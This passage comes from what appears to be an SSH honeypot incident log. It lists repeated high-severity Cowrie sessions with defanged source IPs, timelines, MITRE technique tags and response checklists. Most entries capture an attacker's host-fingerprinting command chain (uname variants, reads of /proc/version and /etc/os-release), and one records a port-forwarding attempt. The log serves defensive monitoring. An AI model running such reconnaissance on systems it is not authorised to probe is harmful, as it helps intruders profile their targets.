| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:07:54` | `cowrie.session.connect` |
| `2026-07-06 14:07:54` | `cowrie.client.version` |
| `2026-07-06 14:07:54` | `cowrie.client.kex` |
| `2026-07-06 14:07:57` | `cowrie.login.success` |
| `2026-07-06 14:07:59` | `cowrie.session.params` |
| `2026-07-06 14:07:59` | `cowrie.command.input` |
| `2026-07-06 14:07:59` | `cowrie.command.input` |
| `2026-07-06 14:07:59` | `cowrie.command.input` |
| `2026-07-06 14:07:59` | `cowrie.command.input` |
| `2026-07-06 14:07:59` | `cowrie.command.input` |
| `2026-07-06 14:07:59` | `cowrie.command.success` |
| `2026-07-06 14:07:59` | `cowrie.command.input` |
| `2026-07-06 14:07:59` | `cowrie.command.input` |
| `2026-07-06 14:07:59` | `cowrie.command.input` |
| `2026-07-06 14:07:59` | `cowrie.command.input` |
| `2026-07-06 14:08:00` | `cowrie.log.closed` |
| `2026-07-06 14:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd7d3ab264ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:09 |
| **Last Seen** | 2026-07-06 14:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:09:15` | `cowrie.session.connect` |
| `2026-07-06 14:09:15` | `cowrie.client.version` |
| `2026-07-06 14:09:15` | `cowrie.client.kex` |
| `2026-07-06 14:09:18` | `cowrie.login.success` |
| `2026-07-06 14:09:20` | `cowrie.session.params` |
| `2026-07-06 14:09:20` | `cowrie.command.input` |
| `2026-07-06 14:09:20` | `cowrie.command.input` |
| `2026-07-06 14:09:20` | `cowrie.command.input` |
| `2026-07-06 14:09:20` | `cowrie.command.input` |
| `2026-07-06 14:09:20` | `cowrie.command.input` |
| `2026-07-06 14:09:20` | `cowrie.command.success` |
| `2026-07-06 14:09:20` | `cowrie.command.input` |
| `2026-07-06 14:09:20` | `cowrie.command.input` |
| `2026-07-06 14:09:20` | `cowrie.command.input` |
| `2026-07-06 14:09:20` | `cowrie.command.input` |
| `2026-07-06 14:09:21` | `cowrie.log.closed` |
| `2026-07-06 14:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36354f38665a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:09 |
| **Last Seen** | 2026-07-06 14:10 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:09:29` | `cowrie.session.connect` |
| `2026-07-06 14:09:36` | `cowrie.client.version` |
| `2026-07-06 14:09:36` | `cowrie.client.kex` |
| `2026-07-06 14:09:54` | `cowrie.login.success` |
| `2026-07-06 14:10:06` | `cowrie.session.params` |
| `2026-07-06 14:10:06` | `cowrie.command.input` |
| `2026-07-06 14:10:06` | `cowrie.command.input` |
| `2026-07-06 14:10:06` | `cowrie.command.input` |
| `2026-07-06 14:10:06` | `cowrie.command.input` |
| `2026-07-06 14:10:06` | `cowrie.command.input` |
| `2026-07-06 14:10:06` | `cowrie.command.success` |
| `2026-07-06 14:10:06` | `cowrie.command.input` |
| `2026-07-06 14:10:06` | `cowrie.command.input` |
| `2026-07-06 14:10:06` | `cowrie.command.input` |
| `2026-07-06 14:10:06` | `cowrie.command.input` |
| `2026-07-06 14:10:09` | `cowrie.log.closed` |
| `2026-07-06 14:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae5a516b4477

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:10 |
| **Last Seen** | 2026-07-06 14:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:10:37` | `cowrie.session.connect` |
| `2026-07-06 14:10:37` | `cowrie.client.version` |
| `2026-07-06 14:10:37` | `cowrie.client.kex` |
| `2026-07-06 14:10:40` | `cowrie.login.success` |
| `2026-07-06 14:10:42` | `cowrie.session.params` |
| `2026-07-06 14:10:42` | `cowrie.command.input` |
| `2026-07-06 14:10:42` | `cowrie.command.input` |
| `2026-07-06 14:10:42` | `cowrie.command.input` |
| `2026-07-06 14:10:42` | `cowrie.command.input` |
| `2026-07-06 14:10:42` | `cowrie.command.input` |
| `2026-07-06 14:10:42` | `cowrie.command.success` |
| `2026-07-06 14:10:42` | `cowrie.command.input` |
| `2026-07-06 14:10:42` | `cowrie.command.input` |
| `2026-07-06 14:10:42` | `cowrie.command.input` |
| `2026-07-06 14:10:42` | `cowrie.command.input` |
| `2026-07-06 14:10:43` | `cowrie.log.closed` |
| `2026-07-06 14:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b50754b6355

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 14:11 |
| **Last Seen** | 2026-07-06 14:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:11:15` | `cowrie.session.connect` |
| `2026-07-06 14:11:15` | `cowrie.client.version` |
| `2026-07-06 14:11:15` | `cowrie.client.kex` |
| `2026-07-06 14:11:16` | `cowrie.login.success` |
| `2026-07-06 14:11:16` | `cowrie.direct-tcpip.request` |
| `2026-07-06 14:11:16` | `cowrie.direct-tcpip.data` |
| `2026-07-06 14:11:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea259b208e1b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:11 |
| **Last Seen** | 2026-07-06 14:12 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:11:23` | `cowrie.session.connect` |
| `2026-07-06 14:11:30` | `cowrie.client.version` |
| `2026-07-06 14:11:30` | `cowrie.client.kex` |
| `2026-07-06 14:11:50` | `cowrie.login.success` |
| `2026-07-06 14:12:00` | `cowrie.session.params` |
| `2026-07-06 14:12:00` | `cowrie.command.input` |
| `2026-07-06 14:12:00` | `cowrie.command.input` |
| `2026-07-06 14:12:00` | `cowrie.command.input` |
| `2026-07-06 14:12:00` | `cowrie.command.input` |
| `2026-07-06 14:12:00` | `cowrie.command.input` |
| `2026-07-06 14:12:00` | `cowrie.command.success` |
| `2026-07-06 14:12:00` | `cowrie.command.input` |
| `2026-07-06 14:12:00` | `cowrie.command.input` |
| `2026-07-06 14:12:00` | `cowrie.command.input` |
| `2026-07-06 14:12:00` | `cowrie.command.input` |
| `2026-07-06 14:12:05` | `cowrie.log.closed` |
| `2026-07-06 14:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ad2c038023a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:11 |
| **Last Seen** | 2026-07-06 14:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:11:58` | `cowrie.session.connect` |
| `2026-07-06 14:11:59` | `cowrie.client.version` |
| `2026-07-06 14:11:59` | `cowrie.client.kex` |
| `2026-07-06 14:12:01` | `cowrie.login.success` |
| `2026-07-06 14:12:03` | `cowrie.session.params` |
| `2026-07-06 14:12:03` | `cowrie.command.input` |
| `2026-07-06 14:12:03` | `cowrie.command.input` |
| `2026-07-06 14:12:03` | `cowrie.command.input` |
| `2026-07-06 14:12:03` | `cowrie.command.input` |
| `2026-07-06 14:12:03` | `cowrie.command.input` |
| `2026-07-06 14:12:03` | `cowrie.command.success` |
| `2026-07-06 14:12:03` | `cowrie.command.input` |
| `2026-07-06 14:12:03` | `cowrie.command.input` |
| `2026-07-06 14:12:03` | `cowrie.command.input` |
| `2026-07-06 14:12:03` | `cowrie.command.input` |
| `2026-07-06 14:12:04` | `cowrie.log.closed` |
| `2026-07-06 14:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b9fec5174c9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 14:12 |
| **Last Seen** | 2026-07-06 14:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:12:21` | `cowrie.session.connect` |
| `2026-07-06 14:12:23` | `cowrie.client.version` |
| `2026-07-06 14:12:23` | `cowrie.client.kex` |
| `2026-07-06 14:12:29` | `cowrie.login.success` |
| `2026-07-06 14:12:33` | `cowrie.session.params` |
| `2026-07-06 14:12:33` | `cowrie.command.input` |
| `2026-07-06 14:12:35` | `cowrie.log.closed` |
| `2026-07-06 14:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65c78f7b1c4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:13 |
| **Last Seen** | 2026-07-06 14:14 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:13:20` | `cowrie.session.connect` |
| `2026-07-06 14:13:25` | `cowrie.client.version` |
| `2026-07-06 14:13:25` | `cowrie.client.kex` |
| `2026-07-06 14:13:48` | `cowrie.login.success` |
| `2026-07-06 14:13:59` | `cowrie.session.params` |
| `2026-07-06 14:13:59` | `cowrie.command.input` |
| `2026-07-06 14:13:59` | `cowrie.command.input` |
| `2026-07-06 14:13:59` | `cowrie.command.input` |
| `2026-07-06 14:13:59` | `cowrie.command.input` |
| `2026-07-06 14:13:59` | `cowrie.command.input` |
| `2026-07-06 14:13:59` | `cowrie.command.success` |
| `2026-07-06 14:13:59` | `cowrie.command.input` |
| `2026-07-06 14:13:59` | `cowrie.command.input` |
| `2026-07-06 14:13:59` | `cowrie.command.input` |
| `2026-07-06 14:13:59` | `cowrie.command.input` |
| `2026-07-06 14:14:02` | `cowrie.log.closed` |
| `2026-07-06 14:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b68de977a28

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:13 |
| **Last Seen** | 2026-07-06 14:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:13:21` | `cowrie.session.connect` |
| `2026-07-06 14:13:21` | `cowrie.client.version` |
| `2026-07-06 14:13:21` | `cowrie.client.kex` |
| `2026-07-06 14:13:24` | `cowrie.login.success` |
| `2026-07-06 14:13:26` | `cowrie.session.params` |
| `2026-07-06 14:13:26` | `cowrie.command.input` |
| `2026-07-06 14:13:26` | `cowrie.command.input` |
| `2026-07-06 14:13:26` | `cowrie.command.input` |
| `2026-07-06 14:13:26` | `cowrie.command.input` |
| `2026-07-06 14:13:26` | `cowrie.command.input` |
| `2026-07-06 14:13:26` | `cowrie.command.success` |
| `2026-07-06 14:13:26` | `cowrie.command.input` |
| `2026-07-06 14:13:26` | `cowrie.command.input` |
| `2026-07-06 14:13:26` | `cowrie.command.input` |
| `2026-07-06 14:13:26` | `cowrie.command.input` |
| `2026-07-06 14:13:27` | `cowrie.log.closed` |
| `2026-07-06 14:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a876a38e82a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:14 |
| **Last Seen** | 2026-07-06 14:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:14:42` | `cowrie.session.connect` |
| `2026-07-06 14:14:42` | `cowrie.client.version` |
| `2026-07-06 14:14:42` | `cowrie.client.kex` |
| `2026-07-06 14:14:45` | `cowrie.login.success` |
| `2026-07-06 14:14:47` | `cowrie.session.params` |
| `2026-07-06 14:14:47` | `cowrie.command.input` |
| `2026-07-06 14:14:47` | `cowrie.command.input` |
| `2026-07-06 14:14:47` | `cowrie.command.input` |
| `2026-07-06 14:14:47` | `cowrie.command.input` |
| `2026-07-06 14:14:47` | `cowrie.command.input` |
| `2026-07-06 14:14:47` | `cowrie.command.success` |
| `2026-07-06 14:14:47` | `cowrie.command.input` |
| `2026-07-06 14:14:47` | `cowrie.command.input` |
| `2026-07-06 14:14:47` | `cowrie.command.input` |
| `2026-07-06 14:14:47` | `cowrie.command.input` |
| `2026-07-06 14:14:47` | `cowrie.log.closed` |
| `2026-07-06 14:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c6b36995a3d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:15 |
| **Last Seen** | 2026-07-06 14:15 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:15:12` | `cowrie.session.connect` |
| `2026-07-06 14:15:17` | `cowrie.client.version` |
| `2026-07-06 14:15:17` | `cowrie.client.kex` |
| `2026-07-06 14:15:40` | `cowrie.login.success` |
| `2026-07-06 14:15:50` | `cowrie.session.params` |
| `2026-07-06 14:15:50` | `cowrie.command.input` |
| `2026-07-06 14:15:50` | `cowrie.command.input` |
| `2026-07-06 14:15:50` | `cowrie.command.input` |
| `2026-07-06 14:15:50` | `cowrie.command.input` |
| `2026-07-06 14:15:50` | `cowrie.command.input` |
| `2026-07-06 14:15:50` | `cowrie.command.success` |
| `2026-07-06 14:15:50` | `cowrie.command.input` |
| `2026-07-06 14:15:50` | `cowrie.command.input` |
| `2026-07-06 14:15:50` | `cowrie.command.input` |
| `2026-07-06 14:15:50` | `cowrie.command.input` |
| `2026-07-06 14:15:54` | `cowrie.log.closed` |
| `2026-07-06 14:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91fbac6317b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:16 |
| **Last Seen** | 2026-07-06 14:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:16:03` | `cowrie.session.connect` |
| `2026-07-06 14:16:04` | `cowrie.client.version` |
| `2026-07-06 14:16:04` | `cowrie.client.kex` |
| `2026-07-06 14:16:06` | `cowrie.login.success` |
| `2026-07-06 14:16:08` | `cowrie.session.params` |
| `2026-07-06 14:16:08` | `cowrie.command.input` |
| `2026-07-06 14:16:08` | `cowrie.command.input` |
| `2026-07-06 14:16:08` | `cowrie.command.input` |
| `2026-07-06 14:16:08` | `cowrie.command.input` |
| `2026-07-06 14:16:08` | `cowrie.command.input` |
| `2026-07-06 14:16:08` | `cowrie.command.success` |
| `2026-07-06 14:16:08` | `cowrie.command.input` |
| `2026-07-06 14:16:08` | `cowrie.command.input` |
| `2026-07-06 14:16:08` | `cowrie.command.input` |
| `2026-07-06 14:16:08` | `cowrie.command.input` |
| `2026-07-06 14:16:09` | `cowrie.log.closed` |
| `2026-07-06 14:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd31a882ed25

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:17 |
| **Last Seen** | 2026-07-06 14:17 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
